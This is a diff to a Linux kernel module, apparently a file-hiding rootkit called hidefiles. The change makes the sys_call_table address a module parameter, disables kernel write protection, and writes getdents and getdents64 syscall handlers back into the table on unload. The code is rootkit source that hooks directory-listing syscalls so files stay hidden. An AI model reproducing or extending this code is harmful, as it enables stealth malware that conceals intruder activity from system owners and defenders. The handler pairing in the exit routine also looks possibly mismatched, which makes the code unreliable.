@@ -13,13 +13,16 @@ MODULE_LICENSE("GPL");
 
 void **sys_call_table;
 //sudo grep sys_call_table /proc/kallsyms
-void *sys_call_table_address = 0xffffffff9da00300;
+// grep sys_call_ta System.map 
+unsigned long sys_call_table_address = 0x00;
+//void *sys_call_table_address = 0xffffffff81a00240;
+module_param(sys_call_table_address, long, S_IRUSR);
 
 static int __init hidefiles_init(void)
 {
-	printk (KERN_INFO "start\n");
-
-	sys_call_table = (void **)sys_call_table_address; 	
+	if (sys_call_table_address == 0)
+		return -1;
+	sys_call_table = (void **)( ( 0xffffffffLL << 32) | sys_call_table_address) ; 	
 	if(sys_call_table == NULL) {
 		printk (KERN_ERR "Failed to find sys call table\n");
 		return 1;
@@ -43,8 +46,8 @@ static void __exit hidefiles_exit(void)
 {
 	printk (KERN_INFO "end \n");
 	disable_write_protection();
-//	sys_call_table[__NR_getdents64] = original_getdents64;
-	sys_call_table[__NR_getdents] = original_getdents;
+	sys_call_table[__NR_getdents64] = original_getdents;
+	sys_call_table[__NR_getdents] = original_getdents_32;
 	enable_write_protection();
 	emptylist();
 	return;
